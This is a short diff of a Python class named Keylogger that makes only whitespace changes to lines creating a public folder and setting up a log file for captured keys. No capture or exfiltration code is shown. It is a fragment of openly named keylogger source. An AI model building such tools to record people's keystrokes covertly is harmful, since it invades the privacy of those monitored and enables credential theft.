@@ -77,8 +77,8 @@ class Keylogger():
     def Run_Keylogger(self):
         '''Beschrijving'''
         keylogger_path = r"C:\Users\Public\keylogger"
-  	if not os.path.exists(os.path.join(keylogger_path)):
-            os.makedirs(os.path.join(keylogger_path))       
+	if not os.path.exists(os.path.join(keylogger_path)):
+            os.makedirs(os.path.join(keylogger_path))
         log_dir = ""
         logging.basicConfig(filename=(log_dir + r"C:\Users\Public\keylogger\keylogs.txt"), \
 	        level=logging.DEBUG, format='%(asctime)s: %(message)s')
